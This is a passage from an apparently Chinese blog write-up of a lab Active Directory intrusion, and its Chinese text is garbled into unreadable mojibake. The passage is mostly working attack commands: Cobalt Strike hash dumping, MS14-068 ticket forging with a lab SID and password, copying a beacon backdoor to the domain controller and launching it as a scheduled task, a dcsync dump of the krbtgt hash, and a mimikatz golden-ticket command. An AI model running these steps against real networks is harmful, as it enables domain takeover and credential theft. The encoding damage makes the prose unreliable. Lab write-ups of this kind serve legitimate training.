<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204314027.png" alt="image-20250512204314027"></p>
<h4 id="è®¾ç½®é—´éš”æ—¶é—´">è®¾ç½®é—´éš”æ—¶é—´</h4>
<p>è®¾ç½®æ—¶é—´é—´éš”ä¸º0ï¼Œä¸ç„¶ä¼šå½±å“åé¢çš„æ“ä½œã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204952134.png" alt="image-20250512204952134"></p>
<h4 id="è·å–hashå’ŒåŸŸå†…ä¿¡ä»»ä¸»æœº">è·å–hashå’ŒåŸŸå†…ä¿¡ä»»ä¸»æœº</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">net view</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205228670.png" alt="image-20250512205228670"></p>
<h4 id="æ‰«æç¯å¢ƒå†…ä¸»æœº">æ‰«æç¯å¢ƒå†…ä¸»æœº</h4>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205837345.png" alt="image-20250512205837345"></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210232067.png" alt="image-20250512210232067"></p>
<p>æ‰«æç»“æœå¦‚ä¸‹ï¼Œå­˜åœ¨ä¸»æœº<code>10.10.10.149</code>ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210509148.png" alt="image-20250512210509148"></p>
<h4 id="åˆ©ç”¨csé›†æˆå‘½ä»¤è¿›è¡Œä¿¡æ¯æ”¶é›†">åˆ©ç”¨csé›†æˆå‘½ä»¤è¿›è¡Œä¿¡æ¯æ”¶é›†</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net computers</span><br><span class="line">net domain</span><br><span class="line">net dclist</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211214829.png" alt="image-20250512211214829"></p>
<h4 id="cs-mimikatz-webæœåŠ¡è·å–æ˜æ–‡">cs mimikatz webæœåŠ¡è·å–æ˜æ–‡</h4>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211552406.png" alt="image-20250512211552406"></p>
<h4 id="dirè®¿é—®åŸŸæ§DC">dirè®¿é—®åŸŸæ§DC</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell \\dc\c$</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512212553216.png" alt="image-20250512212553216"></p>
<h4 id="cs-ms14-068ææƒåˆ°åŸŸæ§">cs ms14-068ææƒåˆ°åŸŸæ§</h4>
<p>ä¸Šä¼ æ–‡ä»¶<code>ms14-068</code>åˆ°<code>web</code>æœåŠ¡å™¨ä¸Šï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œ<code>SID</code>æ¥æºå‰é¢<code>MSF</code>è·å–çš„ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514000630970.png" alt="image-20250514000630970"></p>
<h5 id="åœ¨ms14-068-pyè„šæœ¬ä¸‹åˆ›å»ºç¥¨æ®">åœ¨ms14-068.pyè„šæœ¬ä¸‹åˆ›å»ºç¥¨æ®</h5>
<p>è¿˜å¯ä»¥ä½¿ç”¨<code>ms14-068.py</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>è¿›è¡Œç¥¨æ®çš„åˆ›å»ºã€‚è¿™é‡Œ<code>mac</code>ç”¨æˆ·æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œæ‰§è¡Œæ—¶å€™è¦ä½¿ç”¨åˆ°<code>python2</code>ï¼Œæˆ‘çš„<code>proxychains-ng</code>ç¼–è¯‘æˆäº†<code>arm64</code>æ ¼å¼ï¼Œä½†æ˜¯<code>ms14-068.py</code>ä½¿ç”¨çš„æ‰§è¡Œç¯å¢ƒæ˜¯<code>python2</code>ï¼Œ<code>python2</code>æ˜¯<code>x86</code>çš„ï¼ŒäºŒè€…å†²çªäº†ã€‚éš¾æâ˜¹ï¸ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514102745723.png" alt="image-20250514102745723"></p>
<p>è¿™é‡Œå¦‚æœä½¿ç”¨<code>kali</code>åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç›´æ¥å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python2 ms14-068.py -u web@hackbox.com -s S-1-5-21-2005268815-6584D69957-1189185684-1103 -d 10.10.10.149 -p &#x27;!@#@we456&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="KrbCredExport-å°†-ccache-æ–‡ä»¶è½¬åŒ–ä¸º-kirbi-æ ¼å¼"><strong>KrbCredExport</strong> å°† <strong>.ccache</strong> æ–‡ä»¶è½¬åŒ–ä¸º <strong>kirbi</strong> æ ¼å¼</h5>
<p>ä½¿ç”¨å‰é¢<code>MS14-068.exe</code>è·å–çš„<code>TGT_web@hackbox.com.ccache</code>ï¼Œä½¿ç”¨<code>KrbCredExport.py</code><sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>å°†å…¶è½¬åŒ–ä¸º<code>user.ticket</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py ./ccaches/TGT_web@hackbox.com.ccache ./tickets/user.ticket</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514103702160.png" alt="image-20250514103702160"></p>
<h5 id="å¯¼å…¥ç¥¨æ®è®¿é—®dc">å¯¼å…¥ç¥¨æ®è®¿é—®dc</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use ./tickets/user.ticket</span><br><span class="line">shell dir \\dc\c$</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105022907.png" alt="image-20250514105022907"></p>
<h4 id="è·å–dcåŸŸæ§æƒé™">è·å–dcåŸŸæ§æƒé™</h4>
<p>ç›®å‰æ˜¯æœ‰äº†è®¿é—®<code>dc</code>çš„æƒé™ï¼Œä¸‹é¢å°è¯•è·å–<code>dc</code>åŸŸæ§çš„æ§åˆ¶æƒé™ã€‚</p>
<h5 id="è®¾ç½®smbè¿æ¥å™¨ï¼Œè¿›è¡Œæ­£å‘è¿æ¥">è®¾ç½®smbè¿æ¥å™¨ï¼Œè¿›è¡Œæ­£å‘è¿æ¥</h5>
<p>åˆ›å»ºä¸€ä¸ªè¿æ¥å™¨ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105827103.png" alt="image-20250514105827103"></p>
<p>ç”Ÿæˆ<code>exe</code>ï¼Œå¹¶ä¸Šä¼ åˆ°åŸŸæ§ä¸Šã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514110655360.png" alt="image-20250514110655360"></p>
<h5 id="å¤åˆ¶åé—¨æ–‡ä»¶åˆ°åŸŸæ§ä¸­å¹¶æ‰§è¡Œ">å¤åˆ¶åé—¨æ–‡ä»¶åˆ°åŸŸæ§ä¸­å¹¶æ‰§è¡Œ</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy beacon.exe \\dc\c$\beacon.exe</span><br><span class="line">shell net time \\dc</span><br><span class="line">shell at \\dc 11:49:00 c:/beacon.exe</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ å®šæ—¶ä»»åŠ¡ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115225164.png" alt="image-20250514115225164"></p>
<h5 id="åœ¨beaconæ­£å‘è¿æ¥ä¸Šdc">åœ¨beaconæ­£å‘è¿æ¥ä¸Šdc</h5>
<p><code>link dc</code>è¿æ¥ä¸Š<code>dc</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115403150.png" alt="image-20250514115403150"></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115454588.png" alt="image-20250514115454588"></p>
<h4 id="è·å–dcæ˜æ–‡å“ˆå¸Œ">è·å–dcæ˜æ–‡å“ˆå¸Œ</h4>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115901753.png" alt="image-20250514115901753"></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115954384.png" alt="image-20250514115954384"></p>
<h4 id="csåˆ¶ä½œé»„é‡‘ç¥¨æ®">csåˆ¶ä½œé»„é‡‘ç¥¨æ®</h4>
<h5 id="åœ¨åŸŸæ§ä¸Šæ‰§è¡Œå‘½ä»¤å¯¼å‡ºkrbtgtä¿¡æ¯">åœ¨åŸŸæ§ä¸Šæ‰§è¡Œå‘½ä»¤å¯¼å‡ºkrbtgtä¿¡æ¯</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">dcsync hackbox.com hackbox\krbtgt</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514120300664.png" alt="image-20250514120300664"></p>
<p>è·å–æ•°æ®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åŸŸ:hackbox.com</span><br><span class="line">krbtgtçš„NTLMå“ˆå¸Œå€¼ä¸º:6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">åŸŸçš„SIDï¼ˆæ™®é€šç”¨æˆ·çš„SIDé™¤å»æœ€åä¸‰ä½å°±æ˜¯åŸŸçš„SIDï¼‰:S-1-5-21-2005268815-658469957-1189185684</span><br></pre></td></tr></table></figure>
<h5 id="åœ¨webæœåŠ¡å™¨ä¸Šåˆ¶ä½œé»„é‡‘ç¥¨æ®">åœ¨webæœåŠ¡å™¨ä¸Šåˆ¶ä½œé»„é‡‘ç¥¨æ®</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:x2ntest1 /domain:hackbox.com /sid:S-1-5-21-2005268815-658469957-1189185684 /krbtgt:6f60ace6accbcb76078ccc0312174e98 /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514121400389.png" alt="image-20250514121400389"></p>
<p>æœªä½¿ç”¨ç¥¨æ®å‰ï¼Œè®¿é—®å¤±è´¥ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122841610.png" alt="image-20250514122841610"></p>
<p>ä½¿ç”¨é»„é‡‘ç¥¨æ®åï¼Œå¯ä»¥ç›´æ¥è®¿é—®åŸŸæ§äº†ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123111483.png" alt="image-20250514123111483"></p>
<h2 id="FLAGè·å–">FLAGè·å–</h2>
<h3 id="Web-flag1">Web flag1</h3>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122330806.png" alt="image-20250514122330806"></p>
<h3 id="Web-flag2">Web flag2</h3>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122516477.png" alt="image-20250514122516477"></p>
<h3 id="DC-flag3">DC flag3</h3>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123200938.png" alt="image-20250514123200938"></p>
<h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/baicaix86/p/16418840.html">https://www.cnblogs.com/baicaix86/p/16418840.html</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</a> <a href="#fnref4" class="footnote-backref">â†©ï¸</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a> <a href="#fnref5" class="footnote-backref">â†©ï¸</a></p>
</li>
<li id="fn6" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a> <a href="#fnref6" class="footnote-backref">â†©ï¸</a></p>
</li>
</ol>
</section>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2025-05-14 17:22:38
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" title="é»„é‡‘ç¥¨æ®">
                        #é»„é‡‘ç¥¨æ®
                      </a>
                    </span>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/%E5%9F%9F%E6%8E%A7/" title="åŸŸæ§">
                        #åŸŸæ§
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="Categories"></i>
                    
                    <span class="span--category">
                      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="å†…ç½‘æ¸—é€">
                        <b>#</b> å†…ç½‘æ¸—é€
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">ç«¯å£æ¢æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text">nmapè·å–ç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-text">å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ffuf%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-text">ffufç›®å½•æ–‡ä»¶æ‰«æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wc-db%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">wc.dbæ–‡ä»¶ä¸‹è½½</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-text">thinkphpæ—¥å¿—æ–‡ä»¶æ³„éœ²</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%97%A5%E5%BF%97%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-text">æå–æ—¥å¿—è·å–å¯†ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#host%E7%A2%B0%E6%92%9E%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">hostç¢°æ’ç®¡ç†åå°å­åŸŸå</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96webshell"><span class="toc-text">ä¸Šä¼ æ–‡ä»¶è·å–webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">MSFè¿›è¡Œææƒå’Œä¿¡æ¯æ”¶é›†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-text">ç”Ÿæˆæ”»å‡»è½½è·</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF"><span class="toc-text">ç›‘å¬ä¸Šçº¿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#migrate%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-text">migrateè¿ç§»è¿›ç¨‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87%E8%8E%B7%E5%8F%96"><span class="toc-text">mimikatzå“ˆå¸Œæ˜æ–‡è·å–</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">è·¨ç½‘æ®µåŸŸæ¸—é€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E8%B7%A8%E7%BD%91%E6%AE%B5%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">MSFè·¨ç½‘æ®µçš„åŸŸæ¸—é€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-text">ç¡®è®¤åŸŸç¯å¢ƒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-text">å®šä½åŸŸæ§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">åŸŸä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-text">ç»ˆç«¯æ‰§è¡Œä¿¡æ¯æ”¶é›†å‘½ä»¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%BF%87%E7%9A%84%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-text">è·å–ç™»é™†è¿‡çš„ç”¨æˆ·ä¿¡æ¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E6%B8%97%E9%80%8FDC%E5%9F%9F%E6%8E%A7"><span class="toc-text">æ·»åŠ è·¯ç”±æ¸—é€DCåŸŸæ§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86%E9%80%9A%E5%9F%9F%E6%8E%A7"><span class="toc-text">å¼€å¯ä»£ç†é€šåŸŸæ§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E9%80%9A%E8%BF%87proxychains%E6%89%AB%E6%8F%8F%E5%9F%9F%E6%8E%A7%E8%AE%BE%E5%A4%87"><span class="toc-text">nmapé€šè¿‡proxychainsæ‰«æåŸŸæ§è®¾å¤‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dms17-010%E8%BF%9B%E8%A1%8C%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BBDC-%E5%A4%B1%E8%B4%A5"><span class="toc-text">æ°¸æ’ä¹‹è“ms17-010è¿›è¡Œæº¢å‡ºæ”»å‡»DC(å¤±è´¥)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ms14-068%E6%8F%90%E6%9D%83%E5%9F%9F%E6%8E%A7"><span class="toc-text">ms14-068ææƒåŸŸæ§</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ms14-068%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">ms14-068çš„æ¡ä»¶</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ms14-068%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-text">ms14-068åˆ›å»ºç¥¨æ®</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%BD%E5%85%A5kiwi%E6%B8%85%E7%90%86%E5%86%85%E5%AD%98%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%86%8D%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-text">è½½å…¥kiwiæ¸…ç†å†…å­˜ç¥¨æ®ï¼Œå†å¯¼å…¥ç¥¨æ®</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E5%9F%9F%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90"><span class="toc-text">è·å–dcåŸŸæ§åˆ¶æƒé™</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91%E8%BD%BD%E8%8D%B7-copy%E5%A4%8D%E5%88%B6%E5%88%B0%E5%9F%9F%E6%8E%A7-%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">ç”Ÿæˆæ­£å‘è½½è·,copyå¤åˆ¶åˆ°åŸŸæ§,å¹¶æ‰§è¡Œå®šæ—¶ä»»åŠ¡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 